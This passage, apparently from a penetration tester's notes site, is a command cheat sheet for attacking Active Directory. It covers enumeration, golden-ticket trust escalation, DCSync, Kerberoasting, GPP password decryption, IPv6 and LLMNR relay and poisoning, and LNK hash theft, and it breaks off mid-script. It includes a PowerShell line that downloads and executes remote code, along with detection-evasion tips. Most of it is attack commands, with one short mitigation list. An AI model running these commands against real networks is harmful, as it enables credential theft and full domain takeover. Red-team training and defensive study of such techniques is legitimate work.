<code>ConvertTo-SID</code> Convert a User or group name to its SID value <code>Get-DomainSPNTicket</code> Requests the Kerberos ticket for a specified Service Principal Name (SPN) account Domain/LDAP Functions: <code>Get-Domain</code> Will return the AD object for the current (or specified) domain <code>Get-DomainController</code> Return a list of the Domain Controllers for the specified domain <code>Get-DomainUser</code> Will return all users or specific user objects in AD <code>Get-DomainComputer</code> Will return all computers or specific computer objects in AD <code>Get-DomainGroup</code> Will return all groups or specific group objects in AD <code>Get-DomainOU</code> Search for all or specific OU objects in AD <code>Find-InterestingDomainAcl</code> Finds object ACLs in the domain with modification rights set to non-built in objects <code>Get-DomainGroupMember</code> Will return the members of a specific domain group <code>Get-DomainFileServer</code> Returns a list of servers likely functioning as file servers <code>Get-DomainDFSShare</code> Returns a list of all distributed file systems for the current (or specified) domain GPO Functions: <code>Get-DomainGPO</code> Will return all GPOs or specific GPO objects in AD <code>Get-DomainPolicy</code> Returns the default domain policy or the domain controller policy for the current domain Computer Enumeration Functions: <code>Get-NetLocalGroup</code> Enumerates local groups on the local or a remote machine <code>Get-NetLocalGroupMember</code> Enumerates members of a specific local group <code>Get-NetShare</code> Returns open shares on the local (or a remote) machine <code>Get-NetSession</code> Will return session information for the local (or a remote) machine <code>Test-AdminAccess</code> Tests if the current user has administrative access to the local (or a remote) machine Threaded 'Meta'-Functions: <code>Find-DomainUserLocation</code> Finds machines where specific users are logged in <code>Find-DomainShare</code> Finds reachable shares on domain machines <code>Find-InterestingDomainShareFile</code> Searches for files matching specific criteria on readable shares in the domain <code>Find-LocalAdminAccess</code> Find machines on the local domain where the current user has local administrator access Domain Trust Functions: <code>Get-DomainTrust</code> Returns domain trusts for the current domain or a specified domain <code>Get-ForestTrust</code> Returns all forest trusts for the current forest or a specified forest <code>Get-DomainForeignUser</code> Enumerates users who are in groups outside of the user's domain <code>Get-DomainForeignGroupMember</code> Enumerates groups with users outside of the group's domain and returns each foreign member <code>Get-DomainTrustMapping</code> Will enumerate all trusts for the current domain and any others seen. <p><pre><code>Get-DomainUser -Identity &lt;username&gt; -Domain &lt;domain.local&gt; | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol\n</code></pre> <pre><code>Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse\n</code></pre> <pre><code>Get-DomainTrustMapping\n</code></pre> <pre><code>Test-AdminAccess -ComputerName ACADEMY-EA-MS01\n</code></pre> <pre><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName\n</code></pre></p>","tags":["Authenticated","Bloodhound","DACL","PingCastle","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Domain%20Wide%20Enumeration/#powershell","title":"Powershell","text":"<p><pre><code>Get-Module\n</code></pre> <pre><code>Import-Module ActiveDirectory\n</code></pre> <pre><code>Get-ADDomain\n</code></pre> <pre><code>Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\n</code></pre> <pre><code>Get-ADTrust -Filter *\n</code></pre> <pre><code>Get-ADGroup -Filter * | select name\nGet-ADGroup -Identity \"Backup Operators\"\nGet-ADGroupMember -Identity \"Backup Operators\"\n</code></pre></p>","tags":["Authenticated","Bloodhound","DACL","PingCastle","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Domain%20Wide%20Enumeration/#raw-ldap","title":"Raw LDAP","text":"<pre><code>ldapsearch -x -b \"DC=EGOTISTICAL-BANK,DC=LOCAL\" -H ldap://10.10.10.175\n</code></pre>","tags":["Authenticated","Bloodhound","DACL","PingCastle","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Forest%20%26%20Domain%20Trusts/","title":"Forest & Domain Trusts","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Forest%20%26%20Domain%20Trusts/#overview","title":"Overview","text":"<p>A trust is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides.</p> <ul> <li><code>Parent-child</code>: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain <code>corp.inlanefreight.local</code> could authenticate into the parent domain <code>inlanefreight.local</code>, and vice-versa.</li> <li><code>Cross-link</code>: A trust between child domains to speed up authentication.</li> <li><code>External</code>: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering or filters out authentication requests (by SID) not from the trusted domain.</li> <li> <p><code>Tree-root</code>: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.  </p> </li> <li> <p><code>Forest</code>: A transitive trust between two forest root domains.</p> </li> <li>ESAE: A bastion forest used to manage Active Directory. Trusts can be transitive or non-transitive.</li> <li>A <code>transitive</code> trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if <code>Domain A</code> has a trust with <code>Domain B</code>, and <code>Domain B</code> has a <code>transitive</code> trust with <code>Domain C</code>, then <code>Domain A</code> will automatically trust <code>Domain C</code>.</li> <li>In a <code>non-transitive trust</code>, the child domain itself is the only one trusted.</li> </ul> Transitive Non-Transitive Shared, 1 to many Direct trust The trust is shared with anyone in the forest Not extended to next level child domains Forest, tree-root, parent-child, and cross-link trusts are transitive Typical for external or custom trust setups <p>one-way or two-way (bidirectional). - <code>One-way trust</code>: Users in a <code>trusted</code> domain can access resources in a trusting domain, not vice-versa. - <code>Bidirectional trust</code>: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between <code>INLANEFREIGHT.LOCAL</code> and <code>FREIGHTLOGISTICS.LOCAL</code>, users in <code>INLANEFREIGHT.LOCAL</code> would be able to access resources in <code>FREIGHTLOGISTICS.LOCAL</code>, and vice-versa.</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Forest%20%26%20Domain%20Trusts/#identify","title":"Identify","text":"<p>Remote <pre><code>nxc ldap &lt;ip&gt; -u user -p pass -M enum_trusts\n</code></pre> Local <pre><code>Import-Module activedirectory\nGet-ADTrust -Filter *\n</code></pre> <pre><code>netdom query /domain:inlanefreight.local trust\n</code></pre> Find DC <pre><code>netdom query /domain:inlanefreight.local dc\n</code></pre> Find other machines <pre><code>netdom query /domain:inlanefreight.local workstation\n</code></pre></p> <p>Enum users in child domain <pre><code>Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Forest%20%26%20Domain%20Trusts/#child-parent-trusts-from-windows","title":"Child -&gt; Parent Trusts from Windows","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Forest%20%26%20Domain%20Trusts/#sidhistory-attribute","title":"sidHistory attribute","text":"<p>If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain. - If child domain has been compromised, this will allow you to move into parent domain - if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest.</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Forest%20%26%20Domain%20Trusts/#attack-requirements","title":"Attack Requirements","text":"<ul> <li>The KRBTGT hash for the child domain</li> <li>The SID for the child domain</li> <li>The name of a target user in the child domain (does not need to exist!)</li> <li>The FQDN of the child domain.</li> <li>The SID of the Enterprise Admins group of the root domain.</li> <li>With this data collected, the attack can be performed with Mimikatz. Obtain KRBTGT for child domain <pre><code>mimikatz # lsadump::dcsync /user:CHILD\\krbtgt\n</code></pre> Get SID for child domain <pre><code>Get-DomainSID\n</code></pre> Get SID of Enterprise Admins group of root domain <pre><code>Get-DomainGroup -Domain DOMAIN.LOCAL -Identity \"Enterprise Admins\" | select distinguishedname,objectsid\n# or with ad module\n Get-ADGroup -Identity \"Enterprise Admins\" -Server \"DOMAIN.LOCAL\"\n</code></pre> FQDN of the child <pre><code>Get-ADDomain\n</code></pre> Create Golden Ticket with Mimikatz <pre><code>mimikatz # kerberos::golden /user:hacker /domain:CHILD.DOMAIN.LOCAL /sid:&lt;SID-OF-CHILD-DOMAIN&gt; /krbtgt:&lt;KRBTGTHASH&gt; /sids:&lt;SID-of-Enterperise-Admins-gropup-of-root-domain&gt; /ptt\n</code></pre> Create Golden Ticket with Rubeus <pre><code>.\\Rubeus.exe golden /rc4:&lt;KRBTGT-HASH&gt; /domain:CHILD.DOMAIN.LOCAL /sid:&lt;SID-OF-CHILD-DOMAIN&gt;  /sids:&lt;SID-of-Enterperise-Admins-gropup-of-root-domain&gt; /user:hacker /ptt\n</code></pre> DCSync <pre><code>mimikatz # lsadump::dcsync /user:DOMAIN\\lab_adm\n</code></pre> If our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller <pre><code>mimikatz # lsadump::dcsync /user:DOMAIN\\lab_adm /domain:DOMAIN.LOCAL\n</code></pre></li> </ul>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Forest%20%26%20Domain%20Trusts/#child-parent-trusts-from-linux","title":"Child -&gt; Parent Trusts from Linux","text":"<p><pre><code>impacket-secretsdump child.domain.local/&lt;owned_user&gt;@&lt;DCIP&gt; -just-dc-user CHILD/krbtgt\n</code></pre> <pre><code>lookupsid.py child.domain.local/&lt;owned_user&gt;@&lt;dcip&gt; | grep \"Domain SID\"\n</code></pre> <pre><code>lookupsid.py child.domain.local/&lt;owned_user&gt;@&lt;target-dc-ip&gt; | grep -B12 \"Enterprise Admins\"\n</code></pre> request ticket <pre><code>impacket-ticketer -nthash &lt;krbtgthash&gt; -domain CHILD.DOMAIN.LOCAL -domain-sid &lt;CHILD DOMAIN SID&gt; -extra-sid &lt;enterprise-admins-sid&gt; hacker\n</code></pre> <pre><code>export KRB5CCNAME=hacker.ccache \n</code></pre> <pre><code>impacket-psexec CHILD.DOMAIN.LOCAL/hacker@dc01.domain.local -k -no-pass -target-ip &lt;dc-ip&gt;\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Forest%20%26%20Domain%20Trusts/#automated-attack","title":"Automated attack","text":"<pre><code>raiseChild.py -target-exec &lt;target-dc&gt; child.domain.local/lab_adm\n</code></pre>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Forest%20%26%20Domain%20Trusts/#cross-forest-trust-abuse-from-windows","title":"Cross-Forest Trust Abuse - from Windows","text":"<p>Cross-Forest Kerberoasting depending on the trust direction. In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold <pre><code>Get-DomainUser -SPN -Domain DOMAIN2.LOCAL | select SamAccountName\n</code></pre> <pre><code>Get-DomainUser -Domain DOMAIN2.LOCAL -Identity sqlsvc |select samaccountname,memberof\n</code></pre> <pre><code>.\\Rubeus.exe kerberoast /domain:DOMAIN2.LOCAL /user:sqlsvc /nowrap\n</code></pre> Admin Password Re-Use &amp; Group Membership <pre><code>Get-DomainForeignGroupMember -Domain DOMAIN2.LOCAL\n</code></pre> <pre><code>Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500\n</code></pre> <pre><code>Enter-PSSession -ComputerName DC03.DOMAIN2.LOCAL -Credential DOMAIN\\administrator\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Forest%20%26%20Domain%20Trusts/#attacking-domain-trusts-cross-forest-trust-abuse-from-linux","title":"Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux","text":"<p>Cross-Forest Kerberoasting</p> <p>note</p> <p>To do this, we need credentials for a user that can authenticate into the other domain and specify the <code>-target-domain</code> flag in our command</p> <pre><code>impacket-GetUserSPNs -request -target-domain DOMAIN2.LOCAL DOMAIN.LOCAL/user\n</code></pre> <p>it could also be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains. Here, we have yet another example of iterative testing and leaving no stone unturned</p> <p>Hunting Foreign Group Membership with Bloodhound-python add to resolv.conf so we can resolv DNS entries for first domain <pre><code>cat /etc/resolv.conf \n# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)\n#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN\n# 127.0.0.53 is the systemd-resolved stub resolver.\n# run \"resolvectl status\" to see details about the actual nameservers.\n\\#nameserver 1.1.1.1\n\\#nameserver 8.8.8.8\ndomain DOMAIN.LOCAL\nnameserver 172.16.5.5\n</code></pre> Run bloodhound <pre><code>bloodhound-python -d DOMAIN.LOCAL -dc DC01 -c All -u &lt;user&gt; -p &lt;pass&gt;\n</code></pre> add resolv.conf entries for second forest <pre><code>cat /etc/resolv.conf \n# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)\n#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN\n# 127.0.0.53 is the systemd-resolved stub resolver.\n# run \"resolvectl status\" to see details about the actual nameservers.\n\\#nameserver 1.1.1.1\n\\#nameserver 8.8.8.8\ndomain DOMAIN2.LOCAL\nnameserver 172.16.5.238\n</code></pre> Run bloodhound <pre><code>bloodhound-python -d DOMAIN2.LOCAL -dc DC02.DOMNAIN2.LOCAL -c All -u user@DOMAIN.local -p 'pass'\n</code></pre> upload to bloodhound, click on <code>Users with Foreign Domain Group Membership</code> under the <code>Analysis</code> tab and select the source domain as <code>DOMAIN.LOCAL</code>.</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Group%20Membership/","title":"Group Membership","text":"","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Group%20Membership/#identify","title":"Identify","text":"<ul> <li>Domain Admins<ul> <li>Full control of the domain and can manage all resources in the domain.</li> </ul> </li> <li>Enterprise Admins<ul> <li>This group exists in the root domain of a forest and has full rights to administer any domain within the forest.</li> </ul> </li> <li>Schema Admins<ul> <li>Members can modify the AD schema, which affects the entire forest. This group should have no permanent members unless schema changes are being made.</li> </ul> </li> <li>Administrators (Built-in)<ul> <li>By default, this group has wide-ranging administrative privileges on a domain controller.</li> </ul> </li> <li>Server Operators<ul> <li>Members can log on to domain controllers, start/stop services, format hard drives, and perform other significant administrative tasks.</li> </ul> </li> <li>Backup Operators<ul> <li>Members can bypass file permissions to back up and restore files across the domain controller. This often grants access to sensitive data.</li> </ul> </li> <li>Account Operators<ul> <li>Members can create, modify, and delete most user and group accounts (except for certain high-privilege groups), making them powerful with regard to identity management.</li> </ul> </li> <li>DNS Admins<ul> <li>Members manage DNS servers, which control name resolution. A compromise here can enable attacks like DNS poisoning or redirection.</li> </ul> </li> <li>Key Admins &amp; Enterprise Key Admins<ul> <li>Introduced in newer versions of Active Directory Certificate Services (AD CS); these groups can manage public key infrastructure (PKI) objects and certificate authorities.</li> </ul> </li> <li>Exchange Organization Management (if Microsoft Exchange is installed)<ul> <li>Members can administer all Exchange resources and mailboxes, with significant access to messaging data.</li> </ul> </li> </ul>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Group%20Membership/#exploit","title":"Exploit","text":"","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Group%20Membership/#backup-operators","title":"Backup Operators","text":"<p>Remote <pre><code>nxc smb &lt;target&gt; -u '' -p '' -M backup_operator\n</code></pre> Get machine account hash and dump ntds with that. <pre><code>nxc smb 172.16.210.5 -u 'DC01$' -H &lt;MachineAccHash&gt; --ntds --user Administrator\n</code></pre></p>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Group%20Membership/#exchange-groups","title":"Exchange Groups","text":"<p>https://github.com/gdedrouas/Exchange-AD-Privesc</p> <p>Exchange Windows Permissions</p> <ul> <li>members are granted the ability to write a DACL to the domain object. This can be leveraged to give a user DCSync privileges.</li> </ul> <p>Organization Management</p> <ul> <li>access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called Microsoft Exchange Security Groups, which contains the group Exchange Windows Permissions.</li> </ul>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Living%20Off%20the%20Land%20Enumeration/","title":"Living Off the Land Enumeration","text":"","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Living%20Off%20the%20Land%20Enumeration/#os-context","title":"OS Context","text":"<p>Basic enum commands</p> Command Result <code>hostname</code> Prints the PC's Name <code>[System.Environment]::OSVersion.Version</code> Prints out the OS version and revision level <code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code> Prints the patches and hotfixes applied to the host <code>ipconfig /all</code> Prints out network adapter state and configurations <code>set</code> Displays a list of environment variables for the current session (ran from CMD-prompt) <code>echo %USERDOMAIN%</code> Displays the domain name to which the host belongs (ran from CMD-prompt) <code>echo %logonserver%</code> Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt) <pre><code>systeminfo\n</code></pre>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Living%20Off%20the%20Land%20Enumeration/#powershell","title":"Powershell","text":"<p><pre><code>Get-Module\n</code></pre> <pre><code>Get-ExecutionPolicy -List\n</code></pre> <pre><code>Set-ExecutionPolicy Bypass -Scope Process\n</code></pre> <pre><code>Get-ChildItem Env: | ft Key,Value\n</code></pre> <pre><code>Get-Content $env:APPDATA\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt\n</code></pre> <pre><code>powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); &lt;follow-on commands&gt;\"\n</code></pre></p>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Living%20Off%20the%20Land%20Enumeration/#opsec-techniques","title":"OPSEC Techniques","text":"<pre><code>powershell.exe -version 2\n</code></pre>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Living%20Off%20the%20Land%20Enumeration/#checking-defenses","title":"Checking Defenses","text":"<p><pre><code>netsh advfirewall show allprofiles\n</code></pre> <pre><code>sc query windefend\n</code></pre> <pre><code>Get-MpComputerStatus\n</code></pre></p>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Living%20Off%20the%20Land%20Enumeration/#other-users-on-host","title":"Other users on host?","text":"<pre><code>qwinsta\n</code></pre>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Living%20Off%20the%20Land%20Enumeration/#network-information","title":"Network Information","text":"<pre><code>arp -a\nipconfig /all\nroute print\n</code></pre> <p>note</p> <p>Using arp -a and route print will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment.</p>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Living%20Off%20the%20Land%20Enumeration/#windows-management-instrumentation-wmi","title":"Windows Management Instrumentation (WMI)","text":"<p><pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn\n</code></pre> <pre><code>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List\n</code></pre> <pre><code>wmic process list /format:list\n</code></pre> <pre><code>wmic ntdomain list /format:list\n</code></pre> <pre><code>wmic useraccount list /format:list\n</code></pre> <pre><code>wmic group list /format:list\n</code></pre> <pre><code>wmic sysaccount list /format:list\n</code></pre> https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4</p>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Living%20Off%20the%20Land%20Enumeration/#net-commands","title":"Net Commands","text":"<p><pre><code>net accounts\n</code></pre> <pre><code>net accounts /domain\n</code></pre> <pre><code>net group /domain\n</code></pre> <pre><code>net group \"Domain Admins\" /domain\n</code></pre> <pre><code>net group \"domain computers\" /domain\n</code></pre> <pre><code>net group \"Domain Controllers\" /domain\n</code></pre> <pre><code>net group &lt;domain_group_name&gt; /domain\n</code></pre> <pre><code>net groups /domain\n</code></pre> List of domain groups <pre><code>net localgroup\n</code></pre> <pre><code>net localgroup administrators /domain\n</code></pre> <pre><code>net localgroup Administrators\n</code></pre> <pre><code>net localgroup administrators [username] /add\n</code></pre> <pre><code>net share\n</code></pre> <pre><code>net user &lt;ACCOUNT_NAME&gt; /domain\n</code></pre> <pre><code>net user /domain\n</code></pre> <pre><code>net user %username%\n</code></pre> Information about the current user <pre><code>net use x: \\computer\\share\n</code></pre> <pre><code>net view\n</code></pre> <pre><code>net view /all /domain[:domainname]\n</code></pre> <pre><code>Shares on the domains\n</code></pre> <pre><code>net view /domain \n</code></pre></p> <p>OPSEC</p> <p>Typing <code>net1</code> instead of <code>net</code> will execute the same functions without the potential trigger from the net string.</p>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Living%20Off%20the%20Land%20Enumeration/#dsquery","title":"Dsquery","text":"<pre><code>C:\\Windows\\System32\\dsquery.dll\n</code></pre> <p>note</p> <p>Elevated privs required for dsquery</p> <p><pre><code>dsquery user\n</code></pre> <pre><code>dsquery computer\n</code></pre> We can use a dsquery wildcard search to view all objects in an OU, for example. <pre><code>dsquery * \"CN=Users,DC=DOMAIN,DC=LOCAL\"\n</code></pre> <pre><code>dsquery * -filter \"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl\n</code></pre> <pre><code>dsquery * -filter \"(userAccountControl:1.2.840.113556.1.4.803:=8192)\" -limit 5 -attr sAMAccountName\n</code></pre></p>","tags":["Authenticated","Local","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Password%20Policy%20Enumeration/","title":"Password Policy Enumeration","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Password%20Policy%20Enumeration/#from-linux","title":"From Linux","text":"<p><pre><code>nxc smb 172.16.5.5 -u &lt;user&gt; -p password&gt; --pass-pol\n</code></pre> <pre><code>rpcclient -U \"\" -N &lt;target-ip&gt;\nrpcclient -U \"username\" &lt;target-ip&gt;\nrpcclient $&gt; querydominfo\n</code></pre> <pre><code>enum4linux -P &lt;target-ip&gt;\n</code></pre> <pre><code>ldeep ldap -u 'USER' -p \"PASS' -d 'domain.local' -s $IP domain_policy\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Password%20Policy%20Enumeration/#from-windows","title":"From Windows","text":"<p><pre><code>net accounts\n</code></pre> PowerView <pre><code>Get-DomainPolicy\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/GPP%20Password/","title":"GPP Password","text":"<p>When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to.</p>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","SMB","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/GPP%20Password/#identify","title":"Identify","text":"<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1 This was patched in 2014 MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains. Groups.xml</p> <p>cpassword field</p>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","SMB","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/GPP%20Password/#exploit","title":"Exploit","text":"<p><pre><code>nxc smb 172.16.5.5 -u 'user' -p 'pass' -M gpp_autologin\n</code></pre> <pre><code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE\n</code></pre></p>","tags":["Authenticated","Lateral-Movement","Privilege-Escalation","SMB","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/IPv6%20Attacks/","title":"IPv6 Attacks","text":"<p>IPv6 has been adopted slowly and thus underutilized in environments. If IPv6 name resolution is enabled, but a proper DNS server has not been setup to respond to queries, we can man-in-the-middle by using Web Proxy Auto-Discovery Protocol (WPAD) resolution requests to capture and relay hashes to the DC.</p> <p> this attack is most consistently triggered on machine reboot or network stack reload so early mornings are probably the best time to perform this attack</p>","tags":["Initial-Access","MITM6","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/IPv6%20Attacks/#mitm6-ntlmrelayx","title":"mitm6 + ntlmrelayx","text":"<p>Start mitm6 <pre><code>sudo mitm6 -d domain.local\n</code></pre> Now start ntlmrelayx, specify a relay target (DC prolly) will output ldapdomaindump as HTML as well.  <pre><code>impacket-ntlmrelayx -6 -t ldaps://&lt;DCIP&gt; -wh wpad.domain.local -l lootme\n</code></pre> These options instruct ntlmrelayx to do an ldapdomaindump if user hashes are relayed, and create an account with DCSync privileges if a domain admins hash is relayed.</p>","tags":["Initial-Access","MITM6","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/LLMNR%20Poisoning/","title":"LLMNR Poisoning","text":"","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/LLMNR%20Poisoning/#from-linux","title":"From Linux","text":"<p>https://github.com/SpiderLabs/Responder <pre><code>sudo responder -I eth0 \n</code></pre> Wait for hashes to come in Crack them with <pre><code>hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre></p>","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/LLMNR%20Poisoning/#from-windows","title":"From Windows","text":"","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/LLMNR%20Poisoning/#using-inveigh","title":"Using Inveigh","text":"<p>https://github.com/Kevin-Robertson/Inveigh <pre><code>Import-Module .\\Inveigh.ps1\n</code></pre> <pre><code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y\n</code></pre></p>","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/LLMNR%20Poisoning/#c-inveigh-inveighzero","title":"C# Inveigh (InveighZero)","text":"<p><pre><code>.\\Inveigh.exe\n</code></pre> We can quickly view unique captured hashes by typing <code>GET NTLMV2UNIQUE</code>. We can type in <code>GET NTLMV2USERNAMES</code> and see which usernames we have collected. This is helpful if we want a listing of users to perform additional enumeration against and see which are worth attempting to crack offline using Hashcat.</p>","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/LLMNR%20Poisoning/#mitigation","title":"Mitigation","text":"<ol> <li>Select \"Turn OFF multicast Name Resolution\" under Local Computer Policy &gt; Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client in the Group Policy Editor</li> <li>Disable NBT-NS navigate to Network Connections &gt; Network Adapter Properties &gt; TCP/IPv4 Properties &gt; Advanced tab &gt; WINS tab and select \"Disable NetBios over TCP/IP\".  If you cannot disable for whatever reason</li> <li>Require Network Access Control (NAC)</li> <li>Require strong passwords: over 14 characters with capitals and symbols and no common words. The better the password, the longer it takes an attacker to crack the hash</li> </ol>","tags":["Initial-Access","LLMNR","NETBIOS","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/LNK%20File%20Attacks/","title":"LNK File Attacks","text":"<p>Any writable directory (shares, nfs, locally) where users will list contents you can use a .lnk to steal hashes</p> <p><pre><code>$objShell = New-Object -ComObject WScript.Shell\n$lnk = $objShell.CreateShortcut(\"\\\\DC01.domain.local\\OpenShare\\IT-Driver.lnk\")\n$lnk.TargetPath = 